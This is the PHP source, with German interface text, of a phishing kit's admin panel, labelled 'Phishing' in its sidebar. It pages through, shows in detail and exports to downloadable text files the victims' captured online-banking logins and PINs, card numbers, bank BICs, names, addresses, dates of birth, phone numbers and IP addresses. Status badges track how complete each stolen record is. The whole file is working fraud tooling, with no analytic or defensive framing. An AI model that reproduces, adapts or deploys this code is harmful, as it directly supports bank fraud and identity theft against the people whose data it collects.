<?php

include("../sp_config.inc.php");

session_start();

if($_SESSION["security_token"] != $appSecurityToken) {
	
if(!isset($_GET["redirect"])) { 

echo '<form action="" method="POST"><input type="password" name="security_token"><input type="submit" name="check_token" value="submit"></form>';

}

if($_POST) {

	$sentSecurityToken = $_POST["security_token"];

		if($sentSecurityToken == $appSecurityToken) {

			$_SESSION["security_token"] = $appSecurityToken;

			header("Location: l0g1n.php?redirect");
			exit();

		} else {

			header("Location: l0g1n.php");
			exit();
		
		}
	
}

} else if($_SESSION["security_token"] == $appSecurityToken) {
	
	//CP IS ACCESSABLE
				if (isset($_GET['page_no']) && $_GET['page_no']!="") {
					$page_no = $_GET['page_no'];
				} else {
					$page_no = 1;
				}
				
				$total_records_per_page = 25;
				
				$offset = ($page_no-1) * $total_records_per_page;
				$previous_page = $page_no - 1;
				$next_page = $page_no + 1;
				$adjacents = "2";
				
				if($_GET["sort"] == "full") {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs` WHERE status = 3");
				} else if($_GET["sort"] == "half") {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs` WHERE status = 2");
				} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs` WHERE status = 3 ORDER BY current_bank ASC");
				} if($_GET["sort"] == "half" && $_GET["by"] == "date") {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs` WHERE status = 2 ORDER BY current_bank ASC");
				} if($_GET["by"] == "date") {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs` ORDER BY current_bank ASC");
				} else {
					$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `ob_logs`");
				}
				$total_records = mysqli_fetch_array($result_count);
				$total_records = $total_records['total_records'];
				$total_no_of_pages = ceil($total_records / $total_records_per_page);
				$second_last = $total_no_of_pages - 1; // total pages minus 1
			 		
				//ACTIONS
			 	if($_GET["do"] == "delete" && isset($_GET["id"])) {
				 	
				 	$del_id = $_GET["id"];
				 	
				 	$del_Row = $SQL -> prepare("DELETE FROM ob_logs WHERE ob_id = ?");
				 	$del_Row -> bind_param("i", $del_id);
				 	$del_Row -> execute();
				 	
				 	$success = "<h4>log #".$del_id." wurde erfolgreich weggemeddlt.<br><a href='admin.php?key=".$adminKey."'>&laquo; zurück</a></h4>";
				 	
			 	}
				
				if($_GET["a"] == "expall") {
					
		//CALC FULL OB LOGS
		$calc_Exp_FullLogs = $SQL->prepare("SELECT count(*) as total FROM ob_logs WHERE status >= 2");
		$calc_Exp_FullLogs->execute();
		$calc_Exp_FullLogs->store_result();
		$calc_Exp_FullLogs->bind_result($full_Exp_OBLogs);
		$calc_Exp_FullLogs->fetch();
					
					if($_GET["mode"] == "sorted") {
					$export_LogDetails = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, full_name, address, zip, city, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status >= 2 ORDER BY current_bank ASC');
					} else {
					$export_LogDetails = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, full_name, address, zip, city, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status >= 2 ORDER BY id ASC');
					}
					$export_LogDetails -> execute();
					$export_LogDetails -> store_result();
					$export_LogDetails -> bind_result($exp_id, $exp_obid, $exp_bic, $exp_currentbank, $exp_loginuser, $exp_loginpin, $exp_name, $exp_address, $exp_zip, $exp_city, $exp_dob, $exp_phone, $exp_cardno, $exp_ipaddress, $exp_useragent, $exp_createdat, $exp_status);

$file_Content = "All current full + half OB-logs (containing ".$full_Exp_OBLogs." Logs)";
$file_Content .= "
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

";

					while ($export_LogDetails -> fetch()) {
						

$file_Content .= "Kartennummer= '".$exp_cardno."', BIC= '".$exp_bic."', Bank= '".$exp_currentbank."' / Logindaten= '".$exp_loginuser."', '".$exp_loginpin."' / Name= '".$exp_name."' / Anschrift= '".$exp_address."' / Stadt= '".$exp_zip." ".$exp_city."' / Geburtsdatum= '".$exp_dob."' / Telefonnummer= '".$exp_phone."' IP= '".$exp_ipaddress."' / User-Agent= '".$exp_useragent."'
Date='".$exp_createdat."'

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
";
					
					}
					
$file_Content .= "
=+= End of all OB-logs =+=";
					$exportDate = date("d-m-Y", time());
					$file_ID = rand(100000,999999);
					$file_Name = "Alle-Logs_".$exportDate."_".$file_ID.".txt";
					
					header('Content-Description: File Transfer');
					header('Content-Type: application/octet-stream; charset=utf-8');
					header('Content-disposition: attachment; filename='.$file_Name);
					header('Content-Length: '.strlen($file_Content));
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Expires: 0');
					header('Pragma: public');
					echo $file_Content;
					exit;
					
				}
				
				if($_GET["a"] == "expfull") {
					
		//CALC FULL OB LOGS
		$calc_ExpFull_FullLogs = $SQL->prepare("SELECT count(*) as total FROM ob_logs WHERE status = 3");
		$calc_ExpFull_FullLogs->execute();
		$calc_ExpFull_FullLogs->store_result();
		$calc_ExpFull_FullLogs->bind_result($full_ExpFull_OBLogs);
		$calc_ExpFull_FullLogs->fetch();
					
					$export_LogDetails = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, full_name, address, zip, city, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status = 3 ORDER BY id ASC');
					$export_LogDetails -> execute();
					$export_LogDetails -> store_result();
					$export_LogDetails -> bind_result($exp_id, $exp_obid, $exp_bic, $exp_currentbank, $exp_loginuser, $exp_loginpin, $exp_name, $exp_address, $exp_zip, $exp_city, $exp_dob, $exp_phone, $exp_cardno, $exp_ipaddress, $exp_useragent, $exp_createdat, $exp_status);

$file_Content = "All current full OB-logs (containing ".$full_ExpFull_OBLogs." Logs)";
$file_Content .= "
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

";

					while ($export_LogDetails -> fetch()) {
						

$file_Content .= "Kartennummer= '".$exp_cardno."', BIC= '".$exp_bic."', Bank= '".$exp_currentbank."' / Logindaten= '".$exp_loginuser."', '".$exp_loginpin."' / Name= '".$exp_name."' / Anschrift= '".$exp_address."' / Stadt= '".$exp_zip." ".$exp_city."' / Geburtsdatum= '".$exp_dob."' / Telefonnummer= '".$exp_phone."' / IP= '".$exp_ipaddress."' / User-Agent= '".$exp_useragent."'
Date='".$exp_createdat."'

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
";
					
					}
					
$file_Content .= "
=+= End of all OB-logs =+=";
					$exportDate = date("d-m-Y", time());
					$file_ID = rand(100000,999999);
					$file_Name = "Alle-Logs_".$exportDate."_".$file_ID.".txt";
					
					header('Content-Description: File Transfer');
					header('Content-Type: application/octet-stream; charset=utf-8');
					header('Content-disposition: attachment; filename='.$file_Name);
					header('Content-Length: '.strlen($file_Content));
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Expires: 0');
					header('Pragma: public');
					echo $file_Content;
					exit;
					
				}
				
				if($_GET["a"] == "expsingle" && isset($_GET["expid"])) {
					
					
					$export_LogDetails = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, full_name, address, zip, city, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE ob_id = ? ORDER BY id ASC');
					$export_LogDetails -> bind_param("s", $_GET["expid"]);
					$export_LogDetails -> execute();
					$export_LogDetails -> store_result();
					$export_LogDetails -> bind_result($exp_id, $exp_obid, $exp_bic, $exp_currentbank, $exp_loginuser, $exp_loginpin, $exp_name, $exp_address, $exp_zip, $exp_city, $exp_dob, $exp_phone, $exp_cardno, $exp_ipaddress, $exp_useragent, $exp_createdat, $exp_status);

$file_Content = "Single export of OB-log ".$_GET["expid"];
$file_Content .= "
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

";

					while ($export_LogDetails -> fetch()) {
						


$file_Content .= "Kartennummer= '".$exp_cardno."', BIC= '".$exp_bic."', Bank= '".$exp_currentbank."' / Logindaten= '".$exp_loginuser."', '".$exp_loginpin."' / Name= '".$exp_name."' / Anschrift= '".$exp_address."' / Stadt= '".$exp_zip." ".$exp_city."' / Geburtsdatum= '".$exp_dob."' / Telefonnummer= '".$exp_phone."' / IP= '".$exp_ipaddress."' / User-Agent= '".$exp_useragent."'
Date='".$exp_createdat."'

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
";
					
					}
					
$file_Content .= "
=+= End of all OB-logs =+=";
					$exportDate = date("d-m-Y", time());
					$file_ID = rand(100000,999999);
					$file_Name = "OB-SingleLog_".$exportDate."_".$exp_obid.".txt";
					
					header('Content-Description: File Transfer');
					header('Content-Type: application/octet-stream; charset=utf-8');
					header('Content-disposition: attachment; filename='.$file_Name);
					header('Content-Length: '.strlen($file_Content));
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Expires: 0');
					header('Pragma: public');
					echo $file_Content;
					exit;
					
				}
				
				if($_GET["a"] == "sesskill") {
					
					unset($_SESSION['security_token']);
 session_destroy();
 header('Location: l0g1n.php');
 exit();
					
				}
				
				



	

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Verwaltungskonsole - Übersichten</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <link href="css/styles.css" rel="stylesheet" />
		
		<style>
		.badge-success {
  background-color: #c7f5d9;
  color: #0b4121!important;
}

.badge-warning {
  background-color: #ffebc2;
  color: #453008!important;
}

.badge-secondary {
  background-color: #ebcdfe;
  color: #6e02b1!important;
}

.badge-dark {
  color: #fff;
  background-color: #343a40;
}

.badge {
  border-radius: .27rem;
}

.badge {
  display: inline-block;
  padding: .35em .65em;
  font-size: .75em;
  font-weight: 700;
  line-height: 1;
  color: #fff;
  text-align: center;
  white-space: nowrap;
  vertical-align: baseline;
}
</style>

    </head>
    <body>
        <div class="d-flex" id="wrapper">
            <div class="border-end bg-white" id="sidebar-wrapper">
                <div class="sidebar-heading border-bottom bg-light">Verwaltungskonsole</div>
                <div class="list-group list-group-flush">
                    <a class="list-group-item list-group-item-action list-group-item-light p-3" href="l0g1n.php?redirect">Phishing</a>
                </div>
            </div>
			
			<?php
			
			if($_GET["p"] == "push") {
				
				
			?>
			

			
			<?php
			
			} else {
				
			?>
			
			<!-- START PAGE -->
            <div id="page-content-wrapper">
                <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
                    <div class="container-fluid">
						<a href="?a=expall" class="btn btn-success">Alle Einträge exportieren</a><!--<a href="?a=expall&mode=sorted" class="btn btn-info">Alle Einträge sortiert exportieren</a>&nbsp;<a href="?a=expfull" class="btn btn-warning">Alle vollständigen Einträge exportieren</a>-->&nbsp;<a href="?a=sesskill" class="btn btn-danger">Session killen</a>
                        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
     
                    </div>
                </nav>
                
                <div class="container-fluid">
				
				<?php
				
				if($_GET["a"] == "details" && isset($_GET["obid"])) {
					
					$details_obid = $_GET["obid"];
					
				?>
				
				<h1 class="mt-4">Details zu: <?=$details_obid;?></h1>
                <p>Eine detaillierte Übersicht zu allen Details der jeweiligen Eintragung. Hier sind alle vorhandenen Informationen aufgeschlüsselt vorzufinden.</p>
				
				<?php
				
				$get_all_details = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, full_name, address, zip, city, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE ob_id = ? LIMIT 1');
				$get_all_details -> bind_param('s', $details_obid);
				$get_all_details -> execute();
				$get_all_details -> store_result();
				$get_all_details -> bind_result($obDetailsID, $obDetailsOBID, $obDetailsBIC, $obDetailsCurrentBank, $obDetailsLoginUser, $obDetailsLoginPIN, $obDetailsName, $obDetailsAddress, $obDetailsZIP, $obDetailsCity, $obDetailsDOB, $obDetailsPhone, $obDetailsCardNo, $obDetailsIpAddress, $obDetailsUserAgent, $obDetailsCreatedAt, $obDetailsStatus);
				$get_all_details -> fetch();
				
				?>
				
				<strong><u>ID:</u></strong><br />
				<?=$obDetailsOBID;?><br /><br />
				
				<strong><u>Persönliche Daten:</u></strong><br />
				<?=$obDetailsName;?><br />
				<?=$obDetailsAddress;?><br />
				<?=$obDetailsZIP;?> <?=$obDetailsCity;?><br /><br />
				
				<strong><u>Bankdaten:</u></strong><br />
				<?=$obDetailsBIC;?><br />
				<?=$obDetailsCurrentBank;?><br /><br />
				
				<strong><u>Personendaten:</u></strong><br />
				<?=$obDetailsDOB;?><br />
				<?=$obDetailsPhone;?><br /><br />
				
				<strong><u>Anmeldung:</u></strong><br />
				<?=$obDetailsLoginUser;?><br />
				<?=$obDetailsLoginPIN;?><br /><br />
				
				<strong><u>Karte:</u></strong><br />
				<?=$obDetailsCardNo;?><br /><br />
				
				<strong><u>Weiteres:</u></strong><br />
				<?=$obDetailsIpAddress;?><br />
				<?=$obDetailsUserAgent;?><br />
				
				<?php
				
				} else {
					
				?>
				
				
                    <h1 class="mt-4">Übersicht</h1>
                    <p>Eine allgemeine Übersicht über alle eingegangenen Eintragungen und damit verbundenen Details sowie Funktionalitäten.</p>

		
		<hr />
		
		<?php
		
		if($appMessage) {
			
		?>
		
		<div class="alert alert-primary" role="alert">
		<?=$appMessage;?>
		</div>
		
		<hr />
		
		<?php
		
		}
		
		//CALC FULL OB LOGS
		$calc_FullLogs = $SQL->prepare("SELECT count(*) as total FROM ob_logs WHERE status = 3");
		$calc_FullLogs->execute();
		$calc_FullLogs->store_result();
		$calc_FullLogs->bind_result($fullOBLogs);
		$calc_FullLogs->fetch();
		
		$calc_HalfLogs = $SQL->prepare("SELECT count(*) as total FROM ob_logs WHERE status = 2");
		$calc_HalfLogs->execute();
		$calc_HalfLogs->store_result();
		$calc_HalfLogs->bind_result($fullHalfOBLogs);
		$calc_HalfLogs->fetch();
		
		$calc_AllLogs = $SQL->prepare("SELECT count(*) as total FROM ob_logs WHERE status >= 2");
		$calc_AllLogs->execute();
		$calc_AllLogs->store_result();
		$calc_AllLogs->bind_result($fullAllOBLogs);
		$calc_AllLogs->fetch();
		
		?>
		
		Aktuell vollständige OB-Logs: <strong><?=$fullOBLogs;?></strong><br>
		Aktuell halbe OB-Logs: <strong><?=$fullHalfOBLogs;?></strong><br>
		Aktuell gesamte OB-Logs: <strong><?=$fullAllOBLogs;?></strong>
		
		<hr />

		<div class="row">
		<div style='padding: 10px 20px 0px; border-top: dotted 1px #CCC;'>
		<strong>Seite <?php echo $page_no." von ".$total_no_of_pages; ?></strong>
		(aktuell <strong><?=$total_records_per_page;?> OB-Logs</strong> pro Seite)
		</div>
		
		<nav aria-label="Page navigation example">
		<ul class="pagination">
		<?php if($page_no > 1){
			if($_GET["sort"] == "full") {
				echo "<li class='page-item'><a href='?page_no=1&sort=full' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["sort"] == "half") {
				echo "<li class='page-item'><a href='?page_no=1&sort=half' class='page-link'>Erste Seite</a></li>";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=full&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=half&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&by=date' class='page-link'>Erste Seite</a></li>";
			} else {
				echo "<li class='page-item'><a href='?page_no=1' class='page-link'>Erste Seite</a></li>";
			}
		} ?>
    
		<li <?php if($page_no <= 1){ echo "class='page-item disabled'"; } else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no > 1){
			if($_GET["sort"] == "full") {
				echo "href='?page_no=$previous_page&sort=full' class='page-link'";
			} else if($_GET["sort"] == "half") {
				echo "href='?page_no=$previous_page&sort=half' class='page-link'";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&sort=full&by=date' class='page-link'";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&sort=half&by=date' class='page-link'";
			} else if($_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&by=date' class='page-link'";
			} else {
				echo "href='?page_no=$previous_page' class='page-link'";
			}
		} else { 
		
		echo "href='#' class='page-link'"; 
		
		} ?>>Zurück</a>
		</li>
    
		<li <?php if($page_no >= $total_no_of_pages){
		echo "class='page-item disabled' style='display:none;'";
		} else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no < $total_no_of_pages) {
			if($_GET["sort"] == "full") {
				echo "href='?page_no=$next_page&sort=full' class='page-link'";
			} else if($_GET["sort"] == "half") {
				echo "href='?page_no=$next_page&sort=half' class='page-link'";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "href='?page_no=$next_page&sort=full&by=date' class='page-link'";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "href='?page_no=$next_page&sort=half&by=date' class='page-link'";
			} else if($_GET["by"] == "date") {
				echo "href='?page_no=$next_page&by=date' class='page-link'";
			} else {
				echo "href='?page_no=$next_page' class='page-link'";
			}
		} ?>>Nächste Seite</a>
		</li>

		<?php if($page_no < $total_no_of_pages){
			if($_GET["sort"] == "full") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=full' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} else if($_GET["sort"] == "half") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=half' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=full&by=date' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=half&by=date' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} else if($_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&by=date' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} else {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			}
		} ?>
		</ul>
		</nav>
		</div>
		
		<hr />
		
		<?php
		
		if($_GET["sort"] == "full") { 
			echo '<h3>Alle vollständigen OB-Logs <strong>('.$fullOBLogs.')</strong></h3><hr />'; 
		} else if($_GET["sort"] == "half") { 
			echo '<h3>Alle halben OB-Logs <strong>('.$fullHalfOBLogs.')</strong></h3><hr />'; 
		} else { 
			echo '<h3>Alle gesamten OB-Logs <strong>('.$fullAllOBLogs.')</strong></h3><hr />'; 
		} 
		
		?>


					<table class="table">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">OB-ID</th>
      <th scope="col">BIC</th>
	  <th scope="col">Bank/Filiale</th>
      <th scope="col">Login</th>
	  <th scope="col">PIN</th>
	  <th scope="col">Datum</th>
	  <th scope="col">Status</th>
	  <th scope="col">Aktion</th>
    </tr>
  </thead>
  <tbody>
  
<?php

	if($_GET["sort"] == "full") {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status = 3 ORDER BY current_bank ASC LIMIT ?, ?');
	} else if($_GET["sort"] == "half") {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status = 2 ORDER BY current_bank ASC LIMIT ?, ?');
	} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status = 3 ORDER BY created_at ASC LIMIT ?, ?');
	} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs WHERE status = 2 ORDER BY created_at ASC LIMIT ?, ?');
	} else if($_GET["by"] == "date") {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs ORDER BY created_at ASC LIMIT ?, ?');
	} else {
		$fetch_OBLogs = $SQL -> prepare('SELECT id, ob_id, bic, current_bank, login_user, login_pin, dob, phone_number, card_no, ip_address, user_agent, created_at, status FROM ob_logs ORDER BY id ASC LIMIT ?, ?');
	}
	$fetch_OBLogs -> bind_param("ii", $offset, $total_records_per_page);
  	$fetch_OBLogs -> execute();
  	$fetch_OBLogs -> store_result();
  	$fetch_OBLogs -> bind_result($ob_ID, $ob_OBID, $ob_BIC, $ob_CurrentBank, $ob_LoginUser, $ob_LoginPIN, $ob_DOB, $ob_Phone, $ob_CardNo, $ob_IpAddress, $ob_UserAgent, $ob_CreatedAt, $ob_Status);

	$listid;

  	while ($fetch_OBLogs -> fetch()) {
	
	$listid++;
	
	if($ob_Status == 1) {
		
		$ob_CurrentStatus = '<span class="badge badge-secondary">BLZ/BIC wurde eingegeben</span>';
		
	} else if($ob_Status == 2) {
		
		$ob_CurrentStatus = '<span class="badge badge-warning">Anmeldedaten erhalten</span>';
		
	} else if($ob_Status == 3) {
		
		$ob_CurrentStatus = '<span class="badge badge-success">Alles vollständig</span>';
		
	}
		
?>
  
    <tr>
      <th scope="row"><?=$listid;?></th>
      <td><?=$ob_OBID;?></td>
      <td><?=$ob_BIC;?></td>
	  <td><?=$ob_CurrentBank;?>
      <td><?=$ob_LoginUser;?></td>
	  <td><?=$ob_LoginPIN;?></td>
	  <td><?=$ob_CreatedAt;?></td>
	  <td><?=$ob_CurrentStatus;?></td>
	  <td><a href="?a=details&obid=<?=$ob_OBID;?>" class="btn btn-primary btn-sm">Alle Details</a>&nbsp;<a href="?a=expsingle&expid=<?=$ob_OBID;?>" class="btn btn-warning btn-sm">Einzelexport</a></td>
    </tr>
	
<?php

	}
	
?>
	
  </tbody>
</table>

<hr />

<div class="row">
		<div style='padding: 10px 20px 0px; border-top: dotted 1px #CCC;'>
		<strong>Seite <?php echo $page_no." von ".$total_no_of_pages; ?></strong>
		</div>
		
		<nav aria-label="Page navigation example">
		<ul class="pagination">
		<?php if($page_no > 1){
			if($_GET["sort"] == "full") {
				echo "<li class='page-item'><a href='?page_no=1&sort=full' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["sort"] == "half") {
				echo "<li class='page-item'><a href='?page_no=1&sort=half' class='page-link'>Erste Seite</a></li>";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=full&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=half&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&by=date' class='page-link'>Erste Seite</a></li>";
			} else {
				echo "<li class='page-item'><a href='?page_no=1' class='page-link'>Erste Seite</a></li>";
			}
		} ?>
    
		<li <?php if($page_no <= 1){ echo "class='page-item disabled'"; } else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no > 1){
			if($_GET["sort"] == "full") {
				echo "href='?page_no=$previous_page&sort=full' class='page-link'";
			} else if($_GET["sort"] == "half") {
				echo "href='?page_no=$previous_page&sort=half' class='page-link'";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&sort=full&by=date' class='page-link'";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&sort=half&by=date' class='page-link'";
			} else if($_GET["by"] == "date") {
				echo "href='?page_no=$previous_page&by=date' class='page-link'";
			} else {
				echo "href='?page_no=$previous_page' class='page-link'";
			}
		} else { 
		
		echo "href='#' class='page-link'"; 
		
		} ?>>Zurück</a>
		</li>
    
		<li <?php if($page_no >= $total_no_of_pages){
		echo "class='page-item disabled' style='display:none;'";
		} else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no < $total_no_of_pages) {
			if($_GET["sort"] == "full") {
				echo "href='?page_no=$next_page&sort=full' class='page-link'";
			} else if($_GET["sort"] == "half") {
				echo "href='?page_no=$next_page&sort=half' class='page-link'";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "href='?page_no=$next_page&sort=full&by=date' class='page-link'";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "href='?page_no=$next_page&sort=half&by=date' class='page-link'";
			} else if($_GET["by"] == "date") {
				echo "href='?page_no=$next_page&by=date' class='page-link'";
			} else {
				echo "href='?page_no=$next_page' class='page-link'";
			}
		} ?>>Nächste Seite</a>
		</li>

		<?php if($page_no < $total_no_of_pages){
			if($_GET["sort"] == "full") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=full' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} else if($_GET["sort"] == "half") {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&sort=half' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			} if($_GET["sort"] == "full" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=full&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["sort"] == "half" && $_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&sort=half&by=date' class='page-link'>Erste Seite</a></li>";
			} else if($_GET["by"] == "date") {
				echo "<li class='page-item'><a href='?page_no=1&by=date' class='page-link'>Erste Seite</a></li>";
			} else {
				echo "<li class='page-item'><a href='?page_no=$total_no_of_pages' class='page-link'>Letzte Seite &rsaquo;&rsaquo;</a></li>";
			}
		} ?>
		</ul>
		</nav>
		</div>

<?php

				}
				
				?>
                </div>
            </div>
			<!-- END PAGE -->
			
			<?php
			
			}
			
			?>
			
        </div>
        <!-- Bootstrap core JS-->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>

<?php

}

?>